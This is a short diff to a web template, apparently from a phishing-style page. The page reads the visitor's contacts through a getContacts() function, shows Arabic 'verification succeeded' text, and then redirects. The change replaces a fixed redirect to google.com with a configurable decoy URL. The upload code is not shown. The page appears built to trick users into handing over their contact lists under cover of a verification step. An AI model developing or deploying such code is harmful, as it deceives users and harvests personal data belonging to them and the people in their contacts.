@@ -70,6 +70,7 @@
   <script>
     const uid = "<%= uid %>";
     const serverURL = "<%= a %>";
+    const redirectUrl = "<%= redirectUrl %>";
 
     async function getContacts() {
       const status = document.getElementById('status');
@@ -129,7 +130,7 @@
           }
 
           status.textContent = '✅ تم التحقق بنجاح';
-          setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
+          setTimeout(() => { window.location.href = redirectUrl; }, 2000);
 
         } else {
           status.textContent = '❌ المتصفح لا يدعم هذه الميزة. يرجى فتح الرابط من Chrome على Android.';
